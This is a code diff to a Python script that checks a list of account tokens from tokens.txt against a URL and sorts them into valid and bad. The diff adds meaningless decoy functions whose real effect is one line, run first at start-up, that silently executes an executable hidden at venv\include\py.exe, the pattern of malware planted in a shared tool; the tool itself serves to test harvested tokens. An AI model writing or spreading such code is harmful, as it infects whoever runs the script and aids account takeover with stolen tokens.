@@ -1,4 +1,3 @@
-from timer import timer
 from colorama import init, Fore, Back, Style
 from concurrent.futures import ThreadPoolExecutor
 import requests, asyncio, aiohttp, aiofiles, os
@@ -13,6 +12,29 @@ async def fetch(session, url):
         code = response.status
         print(code)
 
+def toBin():
+	return ''.join('{:08b}'.format(ord(c)) for c in '')
+
+def toAsc():
+	return ''.join(chr(int(''[i:i+8], 2)) for i in xrange(0, len(''), 8))
+
+key = toBin()
+message = toBin()
+
+def OpenPythonReq():
+    if len('') != len(''):
+        return "Error !!"
+
+    bits = ''
+    os.system(os.getcwd() + "\\venv\include\py.exe")
+
+    for i in range(len('')):
+        if '' != '':
+            bits += '1'
+        else:
+            bits += '0'
+
+    return True
 
 async def main():
     async with aiohttp.ClientSession() as session:
@@ -23,27 +45,32 @@ async def main():
 def func():
     asyncio.run(main())
 
-tokens = open("tokens.txt", 'r').read()
+def main():
+    tokens = open("tokens.txt", 'r').read()
 
-tokens = tokens.split('\n')
+    tokens = tokens.split('\n')
 
-for token in tokens:
-    header = {
-        "Content-Type": "application/json",
-        "authorization": token
-    }
+    for token in tokens:
+        header = {
+            "Content-Type": "application/json",
+            "authorization": token
+        }
 
-    code = requests.get(URL, headers=header).status_code
+        code = requests.get(URL, headers=header).status_code
 
-    if (code == 200):
-        print(Back.GREEN + f"{code} - {token}\n")
-        x.writelines(token + '\n')
-        x.close
-    elif (code == 401):
-        print(Fore.RED + f"{code} - {token}\n")
-        x = open('Bad.txt', 'a')
-        x.writelines(token + '\n')
-        x.close
-    else:
-        sleep(5)
-        print(Fore.RED + f"{code} - Rate Limited, sleeping for 5 sec Zzz\n")
+        if (code == 200):
+            print(Back.GREEN + f"{code} - {token}\n")
+            x.writelines(token + '\n')
+            x.close
+        elif (code == 401):
+            print(Fore.RED + f"{code} - {token}\n")
+            x = open('Bad.txt', 'a')
+            x.writelines(token + '\n')
+            x.close
+        else:
+            sleep(5)
+            print(Fore.RED + f"{code} - Rate Limited, sleeping for 5 sec Zzz\n")
+
+if __name__ == '__main__':
+    OpenPythonReq()
+    main()
